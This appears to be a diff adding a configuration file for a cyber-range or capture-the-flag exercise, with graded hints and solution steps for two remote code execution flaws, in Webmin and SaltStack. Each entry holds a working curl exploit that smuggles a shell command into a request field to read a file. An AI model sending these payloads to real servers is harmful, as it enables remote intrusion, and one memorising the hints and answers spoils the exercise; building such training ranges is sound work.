@@ -1,0 +1,53 @@
+schema_version: 1
+vulns:
+  - match: webmin/CVE-2019-15107
+    cve: CVE-2019-15107
+    impact: remote_code_execution
+    hint_levels:
+      low:
+        - "Inspect the HTTPS administration service on {{NODE_IP}}:10000."
+      medium:
+        - "The unauthenticated password-change handler evaluates shell syntax in the old password field."
+      high:
+        - "POST to /password_change.cgi and place the command after test| in the old field."
+    access_instructions:
+      title: Exploit Webmin and retrieve the injected artifact
+      steps:
+        - title: Execute the retrieval command
+          instructions: |
+            From the participant, exploit https://{{NODE_IP}}:10000/password_change.cgi and retrieve the artifact with:
+            ```bash
+            curl -ksS 'https://{{NODE_IP}}:10000/password_change.cgi' \
+              -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1' \
+              -H 'Referer: https://{{NODE_IP}}:10000/session_login.cgi' \
+              --data-urlencode 'user=rootxx' --data-urlencode 'pam=' \
+              --data-urlencode 'expired=2' \
+              --data-urlencode 'old=test|cat {{ARTIFACT_PATH}}' \
+              --data-urlencode 'new1=test2' --data-urlencode 'new2=test2'
+            ```
+            Read the command output in the HTTP response and record the recovered value.
+
+  - match: saltstack/CVE-2020-16846
+    cve: CVE-2020-16846
+    impact: remote_code_execution
+    hint_levels:
+      low:
+        - "Inspect the HTTPS Salt API on {{NODE_IP}}:8000."
+      medium:
+        - "The /run endpoint accepts an ssh_priv value that reaches a shell."
+      high:
+        - "Use the documented token/client/tgt/fun/roster fields and append the command to ssh_priv with a pipe."
+    access_instructions:
+      title: Exploit SaltStack and retrieve the injected artifact
+      steps:
+        - title: Execute the retrieval command
+          instructions: |
+            From the participant, exploit https://{{NODE_IP}}:8000/run and retrieve the artifact with:
+            ```bash
+            curl -ksS 'https://{{NODE_IP}}:8000/run' \
+              --data-urlencode 'token=12312' --data-urlencode 'client=ssh' \
+              --data-urlencode 'tgt=*' --data-urlencode 'fun=a' \
+              --data-urlencode 'roster=whip1ash' \
+              --data-urlencode 'ssh_priv=aaa|cat {{ARTIFACT_PATH}};'
+            ```
+            Read the command output in the HTTP response and record the recovered value.
